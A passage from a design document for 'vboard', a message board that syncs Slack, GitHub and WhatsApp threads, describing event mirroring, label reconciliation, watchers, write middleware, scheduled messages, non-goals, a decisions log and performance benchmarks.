`conversations.replies` (`channels:history`). Private channels and DMs answer
403 `private_channel`, and Slack Connect channels (shared with another
organization) 403 `shared_channel`; a channel the app isn't in answers 403
`not_in_channel`, and the app doesn't join it, so someone adds it on purpose.
A channel that doesn't exist, by name or ID, is 404 `channel_not_found`; Slack
rate-limiting is 429 `ratelimited`; Slack failing, or a `#name` lookup that
can't list channels (`list_failed`), is 502; any other Slack refusal is 403
with Slack's code; a target that isn't a channel, thread, or permalink is 400
`invalid_target`. A board that doesn't run the entry answers 404
`not_synced_here`. Nothing is stored, and reading a channel doesn't make the
board listen to it: inbound events still only come from configured channels
and synced threads. Because the app's token reads more than the caller might,
it needs `manage` in every channel.

**Rendering.** Messages use the common author-prefixed body by default.
Configure `render` to change it; credentials and sender-account authorization
remain separate from presentation.

**Assumed:** Chat SDK delivers other bots' messages to `onNewMessage`.
Channels like `#alerts` and `#errors-www` are fed by bots such as Sentry and
Vercel alerts. Only the board's own bot is skipped.

**Known limits:**
- Slack's `chat.postMessage` has no idempotency key. A crash after Slack accepts
  a post but before the consumer records it can post a duplicate.

### GitHub

`github({ adapter, repos })`. Keys are repos (`'owner/repo'`). A value is a
board channel or function for the repo's PRs and issues alike, or
`{ pulls, issues }` to send each somewhere else; leave one out to skip it.
The external channels are `github:owner/repo:pulls` and
`github:owner/repo:issues`.

| Thread | ID |
| --- | --- |
| A PR's conversation tab | `github:owner/repo:123` |
| An issue | `github:owner/repo:issue:45` |
| An inline review thread, grouped under its PR | `github:owner/repo:123:rc:<commentId>` |

**Events.** Chat SDK's adapter handles new comments. The sync adapter handles
comment edits and deletes (`message.edited`, `message.deleted`) and the rest of
the GitHub App's webhooks:

| Event | Mirror behavior |
| --- | --- |
| `pr.opened` | A root, labeled `pr=owner/repo#123` and `state=open` or `state=draft`, joined to the PR thread |
| `pr.ready`, `pr.draft` | Updates `state` (`open`, `draft`). A ready PR the board hasn't seen gets its root |
| `pr.reopened` | A reply ("reopened by ada"), and `state=open` or `state=draft` |
| `issue.opened` | A root, labeled `issue=owner/repo#45` and `state=open` |
| `issue.closed`, `issue.reopened` | A reply ("closed by ada", "reopened by ada"), and `state=closed` or `state=open` |
| `comment` | A reply. This covers issue comments, PR comments, and inline review comments, whose `context` is `path:line` |
| `review.submitted` | A reply such as "approved by ada", plus the review body. `approved` and `changes requested` set the `review` label |
| `review.dismissed` | Unsets `review` |
| `pr.closed` | A reply ("merged by julian" or "closed by julian"), and `state=merged` or `state=closed` |
| `pr.labeled`, `pr.unlabeled`, `issue.labeled`, `issue.unlabeled` | Reconciles `tag.*` labels. No reply |
| `pr.assigned`, `pr.unassigned`, `issue.assigned`, `issue.unassigned` | Reconciles `assignee.*` labels. No reply |

**State labels.** The mirror keeps GitHub's state on each root as labels, so
agents can watch GitHub without polling it:

| Root | Labels |
| --- | --- |
| PR | `state=draft\|open\|merged\|closed`, `review=approved\|changes_requested` (set by the latest approving or change-requesting review) |
| issue | `state=open\|closed` |
| both | `tag.<label>=<name>` per GitHub label, `assignee.<login>=<login>` per assignee |

```bash
vb wait prs --label review=approved                # start a merge when a PR is approved
vb read prs --label state=open                     # what's pending
vb read issues --label tag.bug                     # issues labeled bug
```

- **Tags and assignees are keyed by name, not by platform.** A GitHub label's
  name becomes a key: accents dropped, lowercased, and each run of characters
  other than letters, digits, `_`, `.`, and `-` turned into `-`
  (`good first issue` → `tag.good-first-issue`), at most 64 in all. The value keeps the
  name as written. A name with nothing left (`🐛`) is skipped. Keys don't say
  `github`, so `--label tag.bug` would match a Linear issue's `bug` label too.
  Two names that make the same key share it, until GitHub has neither.
- **Every PR and issue event reconciles them.** GitHub sends a PR's or issue's
  full labels and assignees with each event, so the mirror sets those and
  unsets any `tag.*` or `assignee.*` key GitHub doesn't have. A missed
  `unlabeled` heals on the next event, and a root starts with what its PR or
  issue has when the root is created.
- **A label change that changes nothing writes nothing.** GitHub follows an
  issue opened with labels by a `labeled` event for each; those don't wake
  anyone.

- **Label changes are ordinary `labels.changed` events,** attributed to the
  GitHub actor who caused them. The before/after filter rule means a PR leaving
  `state=open` is delivered to anyone watching that view.
- **The mirror owns `state`, `review`, `tag.*`, and `assignee.*` on GitHub
  roots.** If someone changes them on the board, the next GitHub event
  overwrites them.
- **Board labels never sync out to platforms.**
- **Repo callbacks control whether defaults run.** Delegating through
  `board.sync(channel, event)` imports state labels; callbacks can also supply
  label overrides or call `board.label` themselves.

- **A function receives `{ event, board, permalink }`,** with `event` typed as the union
  above. `permalink()` returns `null` on GitHub. Every event carries `thread`.
- **A comment on a PR or issue the board hasn't seen** fetches it through the
  adapter's `.octokit`, creates a root from its title and URL with its author,
  state, labels, and assignees, then posts the comment as a reply. Known threads
  need no such fetch. Callbacks that skip default imports also skip this lookup. A failed fetch retries the inbound event.
- **Drafts are mirrored immediately.** Watchers can filter by `state=open` if
  they only want ready PRs.
- **Roots never flow into GitHub.** A new board thread in a channel that a repo
  maps to doesn't open an issue.
- **Not synced:** resolving review conversations.

**Setup:**
1. Create a GitHub App, through Connect or by hand.
2. Give it Issues and Pull requests read and write permissions.
3. Subscribe it to these webhooks: Pull requests, Pull request reviews,
   Pull request review comments, Issues, and Issue comments.
4. Point its trigger path at `/api/board/webhooks/github`.
5. With a connector, optionally set `botUserId`, which skips looking it up.
   An adapter of your own takes it in `createGitHubAdapter`.

**Assumed:** Connect forwards all of these events. Today Connect's GitHub
connector lists only `pull_request`, which covers opened, ready for review, and
closed. We expect the rest to follow. Until then, or if you'd rather not use
Connect, set the GitHub App up yourself (see
[Setting up webhooks](#setting-up-webhooks)).

GitHub's `pull_request_review_comment` payload carries the comment's `path` and
`line`, which the sync adapter reads from `message.raw` to fill `context` as
`path:line`.

### WhatsApp (Kapso)

`kapso({ adapter, markRead, numbers })`, plus `render` like the others, with
[Kapso's Chat SDK adapter](https://chat-sdk.dev/adapters/vendor-official/kapso).
`markRead` is required: `kapso()` throws without it.
Keys are WhatsApp phone number IDs (`'16315558151'`), as Kapso shows them, not
the numbers themselves.

```ts
import { kapso } from 'vboard/sync-kapso'
import { createKapsoAdapter } from '@kapso/chat-adapter'
import { WhatsAppClient } from '@kapso/whatsapp-cloud-api'

const client = new WhatsAppClient({
  baseUrl: 'https://api.kapso.ai/meta/whatsapp',
  kapsoApiKey: process.env.KAPSO_API_KEY!,
})

sync: {
  kapso: kapso({
    adapter: createKapsoAdapter({ client }),
    markRead: (input) => client.messages.markRead(input),
    numbers: { '16315558151': 'support' },
  }),
},
```

| Thing | ID |
| --- | --- |
| A business number, the channel | `kapso:16315558151` |
| A Kapso conversation, a thread | `kapso:16315558151:<WhatsApp ID>:<conversation ID>` |

Kapso's adapter base64url-encodes each part of its IDs; the board writes them
decoded, so `--sync` targets and the inbox read as above.

- **A thread is a Kapso conversation.** WhatsApp has no threads, so a contact's
  messages group into Kapso's conversations: one starts when they write, and
  ends after a day of quiet or when someone closes it in Kapso. Writing again
  after that starts a new thread.
- **Authors** are `whatsapp:user:<WhatsApp ID>`, named by their WhatsApp
  profile name.
- **The board never starts a conversation.** A number has no threads to start,
  so a root in a mirrored channel stays on the board. A function can join the
  conversation it was handed with `sync: [event.thread]` on a post.
- **Replies go out within WhatsApp's window.** WhatsApp takes free-form messages
  only within 24 hours of the contact's last one. A board reply after that
  fails, and is recorded as `message.sync_failed`. Templates aren't synced;
  send them with `@kapso/whatsapp-cloud-api`.
- **One reaction each.** WhatsApp keeps one reaction per person per message, so
  a contact's new reaction replaces theirs on the board, and removing it clears
  it. The business number has one too: the board's reactions on a WhatsApp
  message show there as the latest one added, and removing any of them clears
  it.
- **Media comes over as files, both ways.** An image, video, voice note, or
  document becomes an attachment on the board, fetched through Kapso, with its
  caption as the text; a voice note's transcript is quoted when Kapso has one.
  A board message's files follow its text to WhatsApp, each as its own message.
  WhatsApp can't delete them, so they stay when the board message is deleted.
  On a board that keeps no files, each comes over as a line naming it, linked
  when Kapso gives an `https` URL, and none go out.
- **Not synced:** edits and deletes, which WhatsApp can't do for recipients, and
  button and list replies.
- **Board messages post from the business number,** as `*julian*: …`.

**Setup:**
1. In Kapso, create an API key and copy the number's phone number ID.
2. Add a webhook with the URL `https://<host>/api/board/webhooks/kapso`, a
   secret key, and the `whatsapp.message.received` event.
3. Set `KAPSO_API_KEY` and `KAPSO_WEBHOOK_SECRET`, or pass them to
   `createKapsoAdapter`. Without the secret, the adapter rejects every webhook.

## Watchers

A watcher is a `vb tail` the board runs for you. Its `tail` is the expression
you'd type after `vb tail`; `run` gets each event that tail would print, durably,
with nothing kept open.

```ts
import { board } from 'vboard'
import { a2 } from 'vboard/backend-a2'
import { postgres } from 'vboard/backend-a2/store-postgres'
import { vercelQueues } from 'vboard/backend-a2/scheduler-vercel'

const backend = a2({
  store: postgres({ connectionString: process.env.DATABASE_URL! }),
  scheduler: vercelQueues({ topic: 'vboard' }),
})

const team = board({
  backend,
  // sync: { slack: slack({ … }) },
  watch: {
    triage: {
      tail: 'firehose --from slack',
      run: async ({ event, board }) => {
        if (event.type === 'message.posted' && event.message?.re === null)
          await board.reply(event.message.id, 'Thanks! Tracking it.')        // synced to the Slack thread
      },
    },
    wake: {
      tail: '--label wake',
      run: async ({ event }) => {
        if (event.type !== 'message.posted') return
        // await resumeSession(event.message!.labels.wake, event)            // your code, your compute
      },
    },
  },
})
export const GET = team.fetch, POST = team.fetch
export const { scheduler } = backend
```

- **Try it in a terminal first.** `vb tail firehose --from slack --json` prints
  exactly the events `triage` runs on, as `run` receives them.
- **The expression is the CLI's:** a channel (or `prefix/` for a subtree) and
  the shared filters, and `--all`. `--after` isn't a filter: a watcher starts
  at the head when it's deployed and sees every match after. A watcher has no "me", so it names a handle: `--mentions @ada`, or
  `--mentions @julian/claude` for an agent's profile.
- **It sees what a tail sees.** An event is delivered when its message matches
  before or after it, so a watcher runs when a thread enters its view (someone
  labels it `wake=…`), and labels match a message or its thread's root, so it
  runs on that thread's replies too. Check `event.type` for the events you want.
- **The dynamic part is data on the board.** To ask for a wake-up, label a
  thread (`vb label 812 wake=$CLAUDE_CODE_SESSION_ID`) and unset the label when
  done; `vb read --label wake` lists every pending one. Only code you deployed
  runs: the one URL the board is given at runtime is a registered board's own,
  which it wakes with nothing in it ([Watchers over `http()`](#watchers-over-http)).
- **`board` is the handle, acting as the watcher.** Its writes are authored
  by the watcher, `vboard:watch:<id>` (on a board on `http()`,
  `<principal>+<id>`: the deployment, with the watcher's ID as the profile),
  with IDs derived from the match, so a retried `run` doesn't post twice if it
  writes in the same order. They sync like any other write.
- **`when: 'enters'` runs only when a message comes into view:** an existing
  message changes from not matching to matching (a label is set, a text is
  edited), or a new message matches and its thread wasn't already in view. So
  `{ tail: '--label state=done', when: 'enters' }` runs once each time a thread
  is marked done, not on its replies or on later label changes that keep it done.
  It needs a filter to enter.
- **`--all` adds delivery receipts, as in `vb tail`.** A tail hides
  `message.synced` and `message.files_synced` without it, so watchers don't run
  on them by default. A watcher that needs to know where a message landed on a
  platform (to link to its Slack thread, say) adds `--all` and reads
  `payload.external`
  (`{ thread: 'slack:C0123:1727000000.123456', message: '1727000000.123456' }`).
- **A watcher's own writes never wake it.** Writes by other watchers do, so
  two watchers that answer each other loop.
- **Ids** are lowercase letters, numbers, `-` and `_`, up to 64, starting
  with a letter or number. A bad id or expression fails the boot with the
  CLI's error: `watch triage: --after isn't a filter`.

**How it runs.** Each board event is matched against every watcher by one
board-contract consumer, `vboard-watchers`, on the thread's lane. Matches
are appended to the watcher's session in the `vboard-watch` contract
(`watch:<id>`), and `run` happens there, in the `vboard-watch` consumer, on the
thread's lane. So a watcher sees
a thread's events in order, threads run in parallel, and each watcher fails on
its own. A `run` that keeps throwing on one event gets 5 tries; then the watcher
gives up on that event, records `watch.failed` (the match, the thread, and the
error) in its session, logs it, and goes on to the thread's next event. A `run`
that keeps getting killed (a timeout, out of memory) never throws, so it's
counted by attempts instead: A2 counts each kill as a failure when the next
attempt takes over and dead-letters at 10, so on the 10th attempt the watcher
gives up the same way without running it again. It never dead-letters: in A2 a
dead letter stops its consumer's lane until a person redrives it, and a
watcher's lane is the thread's, so one bad event would silence the watcher on
that thread until then. A watcher removed from config skips the matches it
left behind.

**Over `http()`,** the board that keeps the log matches the tails and wakes
the board that runs them, which pulls, runs, and acks: a pulled match is leased
for 5 minutes, an error waits and is tried again, and after 5 tries it's
`watch.failed`. A wake-up carries no credential, and one that doesn't get there
backs off from a minute to an hour. The routes and the queue are in
[Watchers over `http()`](#watchers-over-http).

**Without a scheduler** (`a2()`'s), matching and `run` still happen, in the
request that wrote. What waits for a clock waits for activity instead: a `run`
that threw is tried again on the next write to its session, a lease that ran
out is noticed on the next pull, and a wake-up that didn't arrive, with its
back-off, waits for the next match. Reads never wake anything. That's fine for
a tool, and not enough for a production board with watchers, as for sync.

## Middleware

`board({ middleware: [...] })` runs on every post and edit before it reaches
the backend, from every source: the HTTP API (a board on `http()` using this
one included), sync (default imports and callbacks' writes, as imports),
watchers, the handle, and scheduled sends, which a2() sends through `board()`
as their creator. It's `board()`'s, beside `access`, so it sees every write
once on any backend, its backend's own writes for someone included. A board on
`http()` runs its own on what it writes there, and the board it uses runs its
own on what arrives. It is the one place to filter what reaches the board,
such as prompt injection from a synced platform. It runs only on a write the
caller may make, once `board()` knows it would land (a reply's root is there,
the caller may post, label, and sync where it lands, and has the files it
carries; an edit is its author's own, of a message still there, that it can
read or wrote without reading): one it would refuse answers 403 or 404 first,
so an edit of its principal's message it can't read answers 404 as one that
isn't there does. Each middleware gets the `write`
(IDs as refs: an edit's `id`, a write's `re`, its thread's root), its
`author`, its `source`, `respond(text)`, an in-process `board` handle, and
`next(patch?)`. Calling `next` passes the write on, optionally changing its
text or a post's labels; not calling it drops the write, which never reaches
the log, and so does emptying a write that has no files. A retried post whose
`id` already landed, by the same author in the same channel or thread, returns
that message without running the chain again, and so does an import whose ID
landed. Anyone else's answers 409 `duplicate_id`. Sync finds an event it
imported by its platform IDs first, so an import goes through the chain once.
An import's `source` (`{ key, channel, thread }`, from sync) is what the
middleware is told it came from.

`respond` is what goes back with a write it drops, where the write came from:
for an import, the answer carries it (`{ message: null, dropped: [...] }`) and
sync replies with it in the platform thread, whichever board keeps the log;
otherwise it's the message of the `422 dropped` error the API answers with.
A dropped scheduled send ends its schedule (`reason: 'dropped'`), since its text
never changes. The middleware's own `board` writes as `vboard:middleware` and
skips the middleware. Sync callbacks keep routing (which channel an event goes
to, overrides); middleware decides whether it lands.

## Scheduled messages

Slack's "schedule send", for people and agents: post or reply later, once or on
a repeat, as yourself.

```bash
vb schedule 812 "@pi check prod after this merge; roll back if it's unhealthy" --every 30m --for 1d
vb schedule 812 "@ada friendly ping: can you review?" --in 1d
vb read 812                         # lists the thread's pending schedules: s12  #812 · once · next in 23h …
vb schedule cancel s12              # ada answered: nothing automatic, whoever reads the thread decides
```

- **When:** `--in 1d` or `--at <time>` sends once. `--every 30m` repeats (at
  least 1m apart), first at `--at`, `--in` from now, or one `--every` from now.
- **Stop:** `--until <time>`, `--for 1d` (counted from the first send), or
  `--times N`. A repeat with none runs until it's canceled. The first send, the
  stop, and the repeat reach at most a year out.
- **As whom:** the creator, as the board resolved them when they scheduled it
  (profile and session included), so a scheduled message reads like theirs.
  Each one carries `schedule: { id, n }` (`n` from 0), and `vb read` marks it
  `scheduled s12`, so watchers and people can tell it was scheduled. A watcher that
  ignores an agent's own messages should still let scheduled ones through, or
  the agent's reminders to itself never wake it. It keeps posting after the
  token that created it expires; cancel it to stop it.
- **Each send re-checks its creator.** The schedule stores the token's
  verified claims and the scope it was narrowed by, never the token. Each send
  works out the creator's access from them under the rules as they are then,
  and needs `post` there (and `read`, for a reply; `label`, with labels). A
  creator that no longer has it has the schedule canceled with `revoked`. The
  claims keep the board's own team as the board knew it then (`team`), so a
  rule naming a project without its team still matches in the scheduler's own
  function, which never sees a request to learn it from.
- **Mentions** are checked when you schedule: a handle that matches no one is
  reported then (`unknownMentions`, to a creator that reads the channel), and
  an ambiguous one fails then. At send
  time, one that's become ambiguous stays plain text.
- **Canceling:** a schedule's creator while it can post in the schedule's
  channel, or anyone with `manage` there. A principal ID is coarser than
  access (a repo's workflows share one, as do proxies narrowing one token with
  `x-board-scope`), so the creator check also takes `post`, and `read` unless
  the schedule was created without it (`blind`).
  A reply schedule ends by itself when its thread is deleted.
- **How it runs:** the `vboard-schedules` consumer arms each
  `schedule.created`'s first send as an A2 timer (`session.schedule`) carrying
  `schedule.due { id, n, at }`. The `vboard-schedule-sends` consumer, on lane
  `schedule:<id>`, posts send `n`, appends `schedule.fired` with the next
  due time, and arms it. Timers can't be revoked: a canceled schedule's timer,
  or one for a send already made, fires into a no-op. Each send posts with an
  event ID derived from the schedule and `n`, so a retry after a crash gets
  back the message it already posted rather than posting twice.
  The next send is the next slot after now, so after downtime it sends once
  rather than replaying every missed slot. Vercel Queues delays at most 6 days,
  so a send further out goes in hops of up to 5.
- **It runs on the scheduler,** `a2()`'s `scheduler`: `vercelQueues()` or
  `qstash()` on serverless, or `localScheduler()` for a long-running process
  (a dev server, `vb serve`, tests). `localScheduler()`'s timers live in the
  process, so a schedule whose send was pending at a restart stays `next due`
  and doesn't send. On a board without one, `POST /schedules` (the handle's
  `schedule()`, `vb schedule`) answers 501 `no_scheduler`:
  ``this board has no scheduler: pass `scheduler` to `a2()` to send later``.

## Non-goals for v1

- Full-text search
- Accounts, login, sessions, roles, and moderating others' messages
- Restricting the board's own people, minted or stored tokens and grants, and
  per-thread access rules
- Hiding volume: on `a2()`, message IDs and cursors still show how busy the
  board is
- A hosted web UI: the CLI, `tail`, and `vb inspect` (a page on your own
  machine) are the UI
- Custom views or reducers supplied by whoever mounts the board
- Outbound webhooks as their own feature: a [watcher](#watchers) whose `run`
  calls `fetch` is one
- Aggregations and group-by
- DMs and presence. Typing indicators are in scope (see
  [Typing](#typing)); read receipts that follow cursors are not yet
- Creating external containers: the board never creates Slack channels or
  GitHub repos, issues, or PRs
- Mapping identities across platforms by guesswork (a matching name or
  email): a person links their own accounts ([Linked accounts](#linked-accounts))
- Bundled sync providers other than Slack, GitHub, and WhatsApp (Kapso)

## After v1

- **`linear()`:**
  - Teams are the keys.
  - An issue being created becomes a root labeled `issue=ENG-123`; comments
    become replies, and comment threads (`…:c:<id>`) group under their issue.
  - The issue's workflow state is mirrored into a `status=` label, so agents can
    `vb wait --label status=done`.
  - Labels and the assignee become `tag.*` and `assignee.*`, as GitHub's do. A
    label in a group (`Type › Bug`, one per group) becomes `tag.type=Bug`.
  - Chat SDK's Linear adapter handles only comments, so the module reads issue
    events from the raw webhook, the same way `github()` does.
- **Full-text search,** on the tables (Postgres `pg_trgm` or `tsvector`, SQLite
  FTS5), for `text` filters that don't read through the board.

## Decisions log

| Question | Decision |
| --- | --- |
| Does the audience exchange keep `user_id`? | **Yes, verified 2026-10-01** (see [Tokens](#tokens)). Tokens are always exchanged for the board's URL. |
| Does Chat SDK deliver other bots' messages? | **Assumed yes.** Only the board's own bot is skipped. |
| Does Connect forward GitHub's non-`pull_request` events? | **Assumed yes, eventually.** Until then, set up the GitHub App yourself. |
| Where do review comments go by default? | **Everywhere**, by rule 1, with no exceptions. Repo functions and `--no-sync` give anyone who wants quieter Slack full control. |
| Where do person handles come from? | **Self-declared** (the Vercel username by default), bound to a verified `user_id`. Mentions must resolve to exactly one actor, so a collision is an error, never a misroute. Nothing stronger is needed for v1. |
| Where do read cursors live? | **On the server**, per actor, session, and scope, in a side A2 contract (see [Cursors](#cursors)). Not built yet. |
| What's the bin called? | **`vboard` and `vb`.** `vb` can collide with other tools that install a `vb` binary, and `vb` on npm is an unrelated package. `vboard` always works. |
| Does the CLI generate platform app config for DIY setup? | **No: docs only** (see [Setting up webhooks](#setting-up-webhooks)). |
| Can the board create external channels, repos, issues, or PRs? | **No.** It maps onto existing containers and only starts threads where a platform has threads in a channel. |
| What does each import hold? | **Imports follow the backend.** `vboard` is `board()`, the handle on every board, and what works with any backend. Each backend's own pieces live under its path: `vboard/backend-a2` (with `/store-*`, `/scheduler-*`, `/blob-vercel`, `/contract`) and `vboard/backend-http`. Beside them, `vboard/access` for access rules, `vboard/sync-slack`, `vboard/sync-github`, and `vboard/sync-kapso`, named for the platform they sync, `vboard/sync` for a provider of your own, and `vboard/conformance`. |
| What's a WhatsApp thread? | **A Kapso conversation,** the adapter's own thread. A thread per contact would last forever and mix every question they ask; a conversation ends after a day of quiet, about when WhatsApp stops taking free-form replies. |
| Is there one filter for every write, or one per source? | **One: `middleware` on `board()`**, on any backend (board thread #4100). It sees every write once, before it reaches the backend; a board on `http()` runs its own on what it writes, and the board it uses runs its own on what arrives. Sync callbacks only see synced events, and API writes never pass them, so a filter there misses the CLI, CI, and agents. |
| How does someone prove a platform account is theirs? | **A one-time code posted from it, or the platform's own sign-in** (board thread #676, issue #6). Never a matching name or email: a link changes who `--by` and mentions mean. Links are per board, and only for display and filtering. |
| Can Connect user tokens post as a person? | **Assumed yes, not yet verified with a real consent:** both factory connectors answer `user_authorization_required` and return real consent URLs (issue #6). Which scopes the tokens get is unverified until someone signs in; without them, delivery falls back to the app. |
| Can watchers be added at runtime? | **No: the dynamic part is data.** A registration carries no code: a board on `http()` registers the tails of the watchers it deployed, and its own `https` URL, which the board wakes with no event and no credential (see [Watchers over `http()`](#watchers-over-http)). A watcher reads labels and mentions instead (see [Watchers](#watchers)). |

## Benchmarks before release

The MVP folded every message into one `messages` reducer, which A2 copies on
every read and snapshots whole. Measured on synthetic boards of real factory
messages (about 1 KB each), on an in-process store:

| Messages | Post, as one reducer | Thread read, as one reducer | Post, tables | Thread read, tables | Channel's threads, tables |
| --- | --- | --- | --- | --- | --- |
| 10,000 | 125 ms | 54 ms | 0.4 ms | 0.3 ms | 0.5 ms |
| 50,000 | 665 ms | 294 ms | 0.2 ms | 0.3 ms | 0.5 ms |

On a local Redis, the tables at 50,000 messages: a post 0.2 ms, a thread 0.2
ms, a channel's threads 0.6 ms, about 4 KB of memory a message (three versions
each). A text search that matches nothing reads every message, 127 ms in
scripts of 4,000 IDs.

Almost all of the reducer's cost was copying its state. Its snapshot would
also have outgrown Upstash's 10 MB request limit at about 10,000 messages. That
set the trigger: the tables replaced it. Still to measure, on Postgres over
the network: append throughput through one session, and subscriber cost with
1, 10, and 50 concurrent `tail` subscribers.
